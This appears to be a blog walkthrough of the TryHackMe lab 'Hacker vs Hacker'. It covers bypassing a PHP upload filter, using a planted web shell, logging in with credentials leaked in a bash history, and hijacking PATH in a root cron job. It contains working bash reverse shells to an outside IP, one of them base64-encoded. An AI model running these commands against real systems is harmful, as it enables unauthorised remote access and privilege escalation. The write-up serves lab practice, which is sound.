---
title: Hacker vs Hacker
description: 'Gaining access to an already compromised machine and stopping a script that tries to kick us out'
pubDate: 2023-09-15
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/dc0c7a25ca75eda427f95bfe6e4e24ab.png'
---

In the `upload.php` route there is a comment in the HTML source.

```php
$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
```

This means the backdoor/shell needs to have `.pdf.php` as the last part of the filename.

Doing a few guess and we find: `/cvs/shell.pdf.php`, we can execute command by doing:

```
GET /cvs/shell.pdf.php?cmd=id HTTP/1.1
```

## USER

Shell without special characters:
```bash
echo -n "bash -c 'bash   -i >& /dev/tcp/10.8.119.137/4444   0>&1 '" | base64
YmFzaCAtYyAnYmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjguMTE5LjEzNy80NDQ0ICAgMD4mMSAn
```

Triggering it:

```
GET /cvs/shell.pdf.php?cmd=echo+YmFzaCAtYyAnYmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjguMTE5LjEzNy80NDQ0ICAgMD4mMSAn+|+base64+-d+|+bash HTTP/1.1
```


## ROOT

In the `/home/lachlan` directory we find some entries in the `.bash_history`:

```bash
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

Now we can login as lachlan through SSH with password `thisistheway123`.

```bash
ssh lachlan@10.10.50.105 # <-- thisistheway123
```

We get disconnected after a few seconds though.

The cron persistence is causing the disconnect:

```
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

We can abuse the fact that the `pkill` command doesn't use an absolute path by hijacking the PATH.

Send the command:
```bash
ssh lachlan@10.10.50.105 'cp -p /usr/bin/echo /home/lachlan/bin/pkill' # <-- thisistheway123
```

Now we can login without being disconnected.
We still get this annoying 'nope' message all the time though.

To get a root shell put a reverse shell in the `pkill` file we just created:
```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.8.119.137/4444 0>&1' > /home/lachlan/bin/pkill && chmod +x /home/lachlan/bin/pkill
```

Or do it in one go:
```bash
ssh lachlan@10.10.50.105 'echo "#!/bin/bash\nbash -i >& /dev/tcp/10.8.119.137/4444 0>&1" > /home/lachlan/bin/pkill && chmod +x /home/lachlan/bin/pkill'
```
